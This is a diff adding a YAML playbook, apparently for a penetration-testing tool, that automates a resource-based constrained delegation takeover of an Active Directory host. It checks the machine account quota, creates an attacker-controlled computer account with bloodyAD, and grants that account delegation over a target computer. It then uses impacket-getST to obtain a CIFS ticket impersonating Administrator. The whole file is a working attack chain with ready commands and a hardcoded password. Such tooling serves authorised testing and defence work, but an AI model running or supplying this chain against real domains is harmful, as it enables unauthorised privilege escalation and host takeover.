@@ -1,0 +1,21 @@
+name: ad_rbcd_takeover
+description: confirm MachineAccountQuota, create an attacker computer, configure RBCD with bloodyAD, then impersonate via S4U (getST) to the target host
+vars:
+  NEW_COMPUTER: "attacker$"
+  TARGET_PASSWORD: "ComputerPass123!"
+steps:
+  - title: Check MachineAccountQuota (need > 0 to add a computer account)
+    command: nxc ldap {{DC_IP:ip}} -d {{DOMAIN}} -u {{USERNAME}} -p {{PASSWORD}} -M maq
+    continue_on_error: true
+  - title: "Create an attacker-controlled computer account (arm with: q set CONFIRM_RBCD 1)"
+    command: bloodyAD --host {{DC_HOST}} -d {{DOMAIN}} -u {{USERNAME}} -p {{PASSWORD}} add computer {{NEW_COMPUTER}} '{{TARGET_PASSWORD}}'
+    when: "CONFIRM_RBCD"
+    continue_on_error: false
+  - title: Configure RBCD — let the attacker computer delegate to the target computer
+    command: bloodyAD --host {{DC_HOST}} -d {{DOMAIN}} -u {{USERNAME}} -p {{PASSWORD}} add rbcd '{{TARGET_COMPUTER:str:WS01$}}' '{{NEW_COMPUTER}}'
+    when: "CONFIRM_RBCD"
+    continue_on_error: false
+  - title: S4U impersonation — request a CIFS service ticket as the target user
+    command: impacket-getST -spn cifs/{{RHOST_NAME:str}} -impersonate {{TARGET_USER:str:Administrator}} -dc-ip {{DC_IP:ip}} '{{DOMAIN}}/{{NEW_COMPUTER}}:{{TARGET_PASSWORD}}'
+    when: "CONFIRM_RBCD"
+    continue_on_error: true
